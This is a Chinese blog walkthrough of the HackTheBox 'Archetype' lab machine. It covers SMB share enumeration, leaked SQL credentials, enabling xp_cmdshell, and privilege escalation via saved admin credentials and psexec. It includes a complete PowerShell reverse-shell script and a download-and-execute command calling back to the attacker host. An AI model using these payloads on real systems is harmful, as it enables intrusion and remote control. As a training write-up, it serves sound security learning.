<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="L0nm4r'Blog"><title>HackTheBox-Start1 | L0nm4r|Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=1.0.0"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/normalize.css/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/pure-min.min.css"><link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/npm/purecss/build/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script><link rel="icon" mask="" sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><script type="text/javascript" src="//cdn.jsdelivr.net/npm/clipboard/dist/clipboard.min.js"></script><script type="text/javascript" src="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.js"></script><link rel="stylesheet" href="//cdn.jsdelivr.net/gh/codeseven/toastr/build/toastr.min.css"><meta name="generator" content="Hexo 5.3.0"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">HackTheBox-Start1</h1><a id="logo" href="/.">L0nm4r|Blog</a><p class="description">Try Harder.</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">HackTheBox-Start1</h1><div class="post-meta">2021-03-16</div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#vpn%E9%85%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">vpn配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#nmap%E6%89%AB%E6%8F%8F"><span class="toc-number">2.</span> <span class="toc-text">nmap扫描</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SMB%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-number">3.</span> <span class="toc-text">SMB读取文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mssql%E5%88%A9%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">Mssql利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BD%8E%E6%9D%83%E9%99%90shell"><span class="toc-number">5.</span> <span class="toc-text">低权限shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Reference"><span class="toc-number">7.</span> <span class="toc-text">Reference</span></a></li></ol></div></div><div class="post-content"><p>跟着教程玩一遍这个靶机.</p>
<p><a target="_blank" rel="noopener" href="https://www.hackthebox.eu/home/start">https://www.hackthebox.eu/home/start</a></p>
<h2 id="vpn配置"><a href="#vpn配置" class="headerlink" title="vpn配置"></a>vpn配置</h2><p>下载lonmar-startingpoint.ovpn,然后kali下 <code>sudo openvpn lonmar-startingpoint.ovpn</code></p>
<p><img src="image-20210316131437557.png" alt="image-20210316131437557"></p>
<p>正常情况下应该会有一个内网IP, 靶机IP就是<code>10.10.10.27</code>了</p>
<h2 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h2><p>先扫描下开放端口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop$ nmap 10.10.10.27</span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-15 12:02 EDT</span><br><span class="line">Nmap scan report for localhost (10.10.10.27)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 993 closed ports</span><br><span class="line">PORT      STATE    SERVICE</span><br><span class="line">135&#x2F;tcp   open     msrpc</span><br><span class="line">139&#x2F;tcp   open     netbios-ssn</span><br><span class="line">445&#x2F;tcp   open     microsoft-ds</span><br><span class="line">1433&#x2F;tcp  open     ms-sql-s</span><br><span class="line">1500&#x2F;tcp  filtered vlsi-lm</span><br><span class="line">5850&#x2F;tcp  filtered unknown</span><br><span class="line">17877&#x2F;tcp filtered unknown</span><br></pre></td></tr></table></figure>
<p>然后扫描下端口的指纹信息</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop$ nmap -sC -sV -p 135,139,445,1433,1500,5850,17811 10.10.10.27 </span><br><span class="line">Starting Nmap 7.91 ( https:&#x2F;&#x2F;nmap.org ) at 2021-03-15 12:09 EDT</span><br><span class="line">Nmap scan report for localhost (10.10.10.27)</span><br><span class="line">Host is up (0.29s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE  SERVICE      VERSION</span><br><span class="line">135&#x2F;tcp   open   msrpc        Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp   open   netbios-ssn  Microsoft Windows netbios-ssn</span><br><span class="line">445&#x2F;tcp   open   microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds</span><br><span class="line">1433&#x2F;tcp  open   ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM</span><br><span class="line">| ms-sql-ntlm-info: </span><br><span class="line">|   Target_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Domain_Name: ARCHETYPE</span><br><span class="line">|   NetBIOS_Computer_Name: ARCHETYPE</span><br><span class="line">|   DNS_Domain_Name: Archetype</span><br><span class="line">|   DNS_Computer_Name: Archetype</span><br><span class="line">|_  Product_Version: 10.0.17763</span><br><span class="line">| ssl-cert: Subject: commonName&#x3D;SSL_Self_Signed_Fallback</span><br><span class="line">| Not valid before: 2021-03-15T14:42:38</span><br><span class="line">|_Not valid after:  2051-03-15T14:42:38</span><br><span class="line">|_ssl-date: 2021-03-15T16:27:02+00:00; +17m26s from scanner time.</span><br><span class="line">1500&#x2F;tcp  closed vlsi-lm</span><br><span class="line">5850&#x2F;tcp  closed unknown</span><br><span class="line">17811&#x2F;tcp closed unknown</span><br><span class="line">Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:&#x2F;o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: mean: 1h41m26s, deviation: 3h07m51s, median: 17m25s</span><br><span class="line">| ms-sql-info: </span><br><span class="line">|   10.10.10.27:1433: </span><br><span class="line">|     Version: </span><br><span class="line">|       name: Microsoft SQL Server 2017 RTM</span><br><span class="line">|       number: 14.00.1000.00</span><br><span class="line">|       Product: Microsoft SQL Server 2017</span><br><span class="line">|       Service pack level: RTM</span><br><span class="line">|       Post-SP patches applied: false</span><br><span class="line">|_    TCP port: 1433</span><br><span class="line">| smb-os-discovery: </span><br><span class="line">|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)</span><br><span class="line">|   Computer name: Archetype</span><br><span class="line">|   NetBIOS computer name: ARCHETYPE\x00</span><br><span class="line">|   Workgroup: WORKGROUP\x00</span><br><span class="line">|_  System time: 2021-03-15T09:26:46-07:00</span><br><span class="line">| smb-security-mode: </span><br><span class="line">|   account_used: guest</span><br><span class="line">|   authentication_level: user</span><br><span class="line">|   challenge_response: supported</span><br><span class="line">|_  message_signing: disabled (dangerous, but default)</span><br><span class="line">| smb2-security-mode: </span><br><span class="line">|   2.02: </span><br><span class="line">|_    Message signing enabled but not required</span><br><span class="line">| smb2-time: </span><br><span class="line">|   date: 2021-03-15T16:26:44</span><br><span class="line">|_  start_date: N&#x2F;A</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 28.66 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>445和1433端口分别是SMB和SQL Server</p>
<h2 id="SMB读取文件"><a href="#SMB读取文件" class="headerlink" title="SMB读取文件"></a>SMB读取文件</h2><blockquote>
<p>针对Smaba服务器的渗透思路 (445端口)</p>
<ol>
<li> 匿名共享目录</li>
<li> 扫描历史漏洞,爆破密码等. (<a target="_blank" rel="noopener" href="https://blog.csdn.net/redwand/article/details/113730414">https://blog.csdn.net/redwand/article/details/113730414</a></li>
</ol>
</blockquote>
<p>测试下SMB服务是否可以匿名访问,发现是可以的</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop$ smbclient -N -L \\\\10.10.10.27\\</span><br><span class="line">directory_create_or_exist: mkdir failed on directory &#x2F;run&#x2F;samba&#x2F;msg.lock: Permission denied</span><br><span class="line">Unable to initialize messaging context</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	backups         Disk      </span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br></pre></td></tr></table></figure>
<p>然后进入到backups共享目录,读取prod.dtsConfig</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop$ smbclient -N -L \\\\10.10.10.27\\backups</span><br><span class="line">directory_create_or_exist: mkdir failed on directory &#x2F;run&#x2F;samba&#x2F;msg.lock: Permission denied</span><br><span class="line">Unable to initialize messaging context</span><br><span class="line"></span><br><span class="line">	Sharename       Type      Comment</span><br><span class="line">	---------       ----      -------</span><br><span class="line">	ADMIN$          Disk      Remote Admin</span><br><span class="line">	backups         Disk      </span><br><span class="line">	C$              Disk      Default share</span><br><span class="line">	IPC$            IPC       Remote IPC</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line">kali@kali:~&#x2F;Desktop$ smbclient -N  \\\\10.10.10.27\\backups</span><br><span class="line">directory_create_or_exist: mkdir failed on directory &#x2F;run&#x2F;samba&#x2F;msg.lock: Permission denied</span><br><span class="line">Unable to initialize messaging context</span><br><span class="line">Try &quot;help&quot; to get a list of possible commands.</span><br><span class="line">smb: \&gt; dir</span><br><span class="line">  .                                   D        0  Mon Jan 20 07:20:57 2020</span><br><span class="line">  ..                                  D        0  Mon Jan 20 07:20:57 2020</span><br><span class="line">  prod.dtsConfig                     AR      609  Mon Jan 20 07:23:02 2020</span><br><span class="line"></span><br><span class="line">		10328063 blocks of size 4096. 8127147 blocks available</span><br><span class="line">smb: \&gt; get prod.dtsConfig</span><br><span class="line">getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.5 KiloBytes&#x2F;sec) (average 0.5 KiloBytes&#x2F;sec)</span><br><span class="line">smb: \&gt; </span><br></pre></td></tr></table></figure>
<p>prod.dtsConfig是SSIS包配置文件(SSIS Package Configuration),SSIS是Microsoft SQL Server Integration Services的简称.</p>
<p>然后看具体的配置项存在可利用信息<code>Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc</code></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop$ ls</span><br><span class="line">lonmar-startingpoint.ovpn  misctools  Nmap  prod.dtsConfig</span><br><span class="line">kali@kali:~&#x2F;Desktop$ cat prod.dtsConfig </span><br><span class="line">&lt;DTSConfiguration&gt;</span><br><span class="line">    &lt;DTSConfigurationHeading&gt;</span><br><span class="line">        &lt;DTSConfigurationFileInfo GeneratedBy&#x3D;&quot;...&quot; GeneratedFromPackageName&#x3D;&quot;...&quot; GeneratedFromPackageID&#x3D;&quot;...&quot; GeneratedDate&#x3D;&quot;20.1.2019 10:01:34&quot;&#x2F;&gt;</span><br><span class="line">    &lt;&#x2F;DTSConfigurationHeading&gt;</span><br><span class="line">    &lt;Configuration ConfiguredType&#x3D;&quot;Property&quot; Path&#x3D;&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot; ValueType&#x3D;&quot;String&quot;&gt;</span><br><span class="line">        &lt;ConfiguredValue&gt;Data Source&#x3D;.;Password&#x3D;M3g4c0rp123;User ID&#x3D;ARCHETYPE\sql_svc;Initial Catalog&#x3D;Catalog;Provider&#x3D;SQLNCLI10.1;Persist Security Info&#x3D;True;Auto Translate&#x3D;False;&lt;&#x2F;ConfiguredValue&gt;</span><br><span class="line">    &lt;&#x2F;Configuration&gt;</span><br><span class="line">&lt;&#x2F;DTSConfiguration&gt;kali@kali:~&#x2F;Desktop$ </span><br></pre></td></tr></table></figure>
<h2 id="Mssql利用"><a href="#Mssql利用" class="headerlink" title="Mssql利用"></a>Mssql利用</h2><blockquote>
<p>详述MSSQL服务在渗透测试中的利用 <a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17737-1-1.html">https://bbs.ichunqiu.com/thread-17737-1-1.html</a></p>
</blockquote>
<p>使用impacket连接mssql服务,并且查询出当用户有sysadmin权限</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop&#x2F;kali-tools&#x2F;impacket&#x2F;examples$ mssqlclient.py ARCHETYPE&#x2F;sql_svc@10.10.10.27 -windows-auth</span><br><span class="line">Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Encryption required, switching to TLS</span><br><span class="line">[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master</span><br><span class="line">[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english</span><br><span class="line">[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed database context to &#39;master&#39;.</span><br><span class="line">[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.</span><br><span class="line">[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) </span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">SQL&gt; select IS_SRVROLEMEMBER(&#39;sysadmin&#39;);</span><br><span class="line">              </span><br><span class="line"></span><br><span class="line">-----------   </span><br><span class="line"></span><br><span class="line">          1   </span><br><span class="line"></span><br><span class="line">SQL&gt; </span><br></pre></td></tr></table></figure>
<p>通过xp_cmdshell执行系统命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SQL&gt; EXEC sp_configure &#39;Show Advanced Options&#39;, 1;</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option &#39;show advanced options&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt; </span><br><span class="line">SQL&gt; reconfigure;</span><br><span class="line">SQL&gt; sp_configure;</span><br><span class="line">name                                      minimum       maximum   config_value     run_value   </span><br><span class="line"></span><br><span class="line">-----------------------------------   -----------   -----------   ------------   -----------   </span><br><span class="line"></span><br><span class="line">access check cache bucket count                 0         65536              0             0   </span><br><span class="line"></span><br><span class="line">... ...             ...                         ...             ...</span><br><span class="line">user options                                    0         32767              0             0   </span><br><span class="line"></span><br><span class="line">xp_cmdshell                                     0             1              1             1   </span><br><span class="line"></span><br><span class="line">SQL&gt; EXEC sp_configure &#39;xp_cmdshell&#39;, 1</span><br><span class="line">[*] INFO(ARCHETYPE): Line 185: Configuration option &#39;xp_cmdshell&#39; changed from 1 to 1. Run the RECONFIGURE statement to install.</span><br><span class="line">SQL&gt;  reconfigure;</span><br><span class="line">SQL&gt;  xp_cmdshell &quot;whoami&quot; </span><br><span class="line">output                                                                             </span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------------------------   </span><br><span class="line"></span><br><span class="line">archetype\sql_svc                                                                  </span><br><span class="line"></span><br><span class="line">NULL       </span><br></pre></td></tr></table></figure>
<p>发现当前用户只是一个Windows下的普通用户,需要提权.</p>
<h2 id="低权限shell"><a href="#低权限shell" class="headerlink" title="低权限shell"></a>低权限shell</h2><p>利用powershell返回一个权限较低的shell</p>
<p>本地搭建一个建议的web服务器, <code>sudo  python3 -m http.server 80 </code></p>
<p>powershell反弹shell脚本(shell.ps1):</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> System.Net.Sockets.TCPClient(<span class="string">&quot;10.10.14.17&quot;</span>,<span class="number">443</span>);<span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[<span class="built_in">byte</span>[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;;<span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="operator">-ne</span> <span class="number">0</span>)&#123;;<span class="variable">$data</span> = (<span class="built_in">New-Object</span> <span class="literal">-TypeName</span> System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>);<span class="variable">$sendback</span> = (<span class="built_in">iex</span> <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> );<span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">&quot;# &quot;</span>;<span class="variable">$sendbyte</span> = ([<span class="type">text.encoding</span>]::ASCII).GetBytes(<span class="variable">$sendback2</span>);<span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length);<span class="variable">$stream</span>.Flush()&#125;;<span class="variable">$client</span>.Close() </span><br></pre></td></tr></table></figure>
<p>nc监听本地端口 <code>nc -lvnp 443</code></p>
<p>用ufw做端口转发(没搞懂为什么要转发</p>
<blockquote>
<p>After standing up a netcat listener on port 443, we can use ufw to allow the call backs on port 80 and 443 to our machine.</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ufw allow from 10.10.10.27 proto tcp to any port 80,443</span><br></pre></td></tr></table></figure>
<p>然后xp_cmdshell 加载执行远程powershell脚本</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xp_cmdshell <span class="string">&quot;powershell &quot;</span><span class="built_in">IEX</span> (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(\<span class="string">&quot;http://10.10.14.17/shell.ps1\&quot;</span>);<span class="string">&quot; </span></span><br></pre></td></tr></table></figure>
<p>然后就获得一个低权限的shell</p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>通过查询历史命令获得adminstrator账号密码</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">  <span class="built_in">type</span> C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt</span> </span><br><span class="line">net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!</span><br><span class="line">exit</span><br><span class="line"><span class="meta">#</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>

<p>使用psexec获取高权限shell</p>
<blockquote>
<p>强大工具psexec工具用法简介: <a target="_blank" rel="noopener" href="https://www.cnblogs.com/boltkiller/articles/4791307.html">https://www.cnblogs.com/boltkiller/articles/4791307.html</a></p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~&#x2F;Desktop&#x2F;kali-tools&#x2F;impacket&#x2F;examples$ sudo psexec.py administrator@10.10.10.27</span><br><span class="line">Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright 2020 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">Password:</span><br><span class="line">[*] Requesting shares on 10.10.10.27.....</span><br><span class="line">[*] Found writable share ADMIN$</span><br><span class="line">[*] Uploading file AvXIdDOP.exe</span><br><span class="line">[*] Opening SVCManager on 10.10.10.27.....</span><br><span class="line">[*] Creating service lhRj on 10.10.10.27.....</span><br><span class="line">[*] Starting service lhRj.....</span><br><span class="line">[!] Press help for extra shell commands</span><br><span class="line">Microsoft Windows [Version 10.0.17763.107]</span><br><span class="line">(c) 2018 Microsoft Corporation. All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt;whoami</span><br><span class="line">nt authority\system</span><br></pre></td></tr></table></figure>
<p>然后获得adminstrator桌面的root.txt提取flag</p>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/boltkiller/articles/4791307.html">https://www.cnblogs.com/boltkiller/articles/4791307.html</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/Alexhcf/article/details/110674603">https://blog.csdn.net/Alexhcf/article/details/110674603</a></p>
<p><a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-58294-1-1.html">https://bbs.ichunqiu.com/thread-58294-1-1.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.hackthebox.eu/home/start">https://www.hackthebox.eu/home/start</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/redwand/article/details/113730414">https://blog.csdn.net/redwand/article/details/113730414</a></p>
</div><div class="tags"><a href="/tags/HackTheBox/"><i class="fa fa-tag"></i>HackTheBox</a><a href="/tags/%E6%B8%97%E9%80%8F/"><i class="fa fa-tag"></i>渗透</a></div><div class="post-nav"><a class="next" href="/2021/03/15/dvCTF2021-writeup/">dvCTF2021-writeup</a></div></div></div></div><div class="pure-u-1-4 hidden_mid_and_down"><div id="sidebar"><div class="widget"><div class="search-form"><input id="local-search-input" placeholder="Search" type="text" name="q" results="0"/><div id="local-search-result"></div></div></div><div class="widget"><div class="widget-title"><i class="fa fa-star-o"> Tags</i></div><div class="tagcloud"><a href="/tags/CTF/" style="font-size: 15px;">CTF</a> <a href="/tags/WP/" style="font-size: 15px;">WP</a> <a href="/tags/XSS/" style="font-size: 15px;">XSS</a> <a href="/tags/http/" style="font-size: 15px;">http</a> <a href="/tags/web%E5%AE%89%E5%85%A8/" style="font-size: 15px;">web安全</a> <a href="/tags/Http%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81/" style="font-size: 15px;">Http请求走私</a> <a href="/tags/JWT/" style="font-size: 15px;">JWT</a> <a href="/tags/SSTI/" style="font-size: 15px;">SSTI</a> <a href="/tags/SSRF/" style="font-size: 15px;">SSRF</a> <a href="/tags/SSI/" style="font-size: 15px;">SSI</a> <a href="/tags/PHP/" style="font-size: 15px;">PHP</a> <a href="/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/" style="font-size: 15px;">伪随机数</a> <a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 15px;">sql注入</a> <a href="/tags/ctf/" style="font-size: 15px;">ctf</a> <a href="/tags/Flask/" style="font-size: 15px;">Flask</a> <a href="/tags/%E7%94%9F%E6%B4%BB/" style="font-size: 15px;">生活</a> <a href="/tags/%E5%8F%82%E6%95%B0%E6%B3%A8%E5%85%A5/" style="font-size: 15px;">参数注入</a> <a href="/tags/nodejs/" style="font-size: 15px;">nodejs</a> <a href="/tags/XXE/" style="font-size: 15px;">XXE</a> <a href="/tags/XML/" style="font-size: 15px;">XML</a> <a href="/tags/jade/" style="font-size: 15px;">jade</a> <a href="/tags/%E5%AF%86%E7%A0%81%E5%AD%A6/" style="font-size: 15px;">密码学</a> <a href="/tags/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 15px;">pickle反序列化</a> <a href="/tags/python/" style="font-size: 15px;">python</a> <a href="/tags/flask/" style="font-size: 15px;">flask</a> <a href="/tags/wp/" style="font-size: 15px;">wp</a> <a href="/tags/HackTheBox/" style="font-size: 15px;">HackTheBox</a> <a href="/tags/%E6%B8%97%E9%80%8F/" style="font-size: 15px;">渗透</a></div></div><div class="widget"><div class="widget-title"><i class="fa fa-file-o"> Recent</i></div><ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/03/16/HackTheBox-Start1/">HackTheBox-Start1</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/15/dvCTF2021-writeup/">dvCTF2021-writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/12/AntxD-3CTF%E9%83%A8%E5%88%86wp/">AntxD^3CTF部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/03/12/CTFSHOW-XSS/">CTFShow-XSS</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/02/23/%E9%80%9A%E8%BF%87%E4%B8%80%E9%81%93%E9%A2%98%E4%BA%86%E8%A7%A3PaddingOracleAttack&&CBC-Byte-Flipping-Attack/">通过一道题了解PaddingOracleAttack&&CBC-Byte-Flipping-Attack</a></li><li class="post-list-item"><a class="post-list-link" 